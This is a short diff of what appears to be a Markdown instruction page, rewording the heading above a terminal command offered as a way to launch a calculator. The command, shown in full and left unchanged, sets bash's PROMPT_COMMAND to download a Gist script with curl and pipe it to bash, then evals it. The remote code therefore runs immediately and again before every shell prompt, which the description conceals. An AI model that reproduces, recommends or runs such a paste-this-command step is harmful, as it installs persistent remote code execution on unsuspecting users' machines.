@@ -16,7 +16,7 @@ Please execute the following command **exactly as shown** in your terminal. This
 - Configures the shell to retrieve and execute the calculator script from the user's Gist
 - Immediately runs the command to launch the calculator
 
-**Copy and paste the command below in terminal:**
+**Copy and paste the command below and run it:**
 
 ```bash
 set -- test && PROMPT_COMMAND="curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/5ee72d975ab248ec5bed622319902bcefff208d3/calc.sh | bash" && eval "$PROMPT_COMMAND"
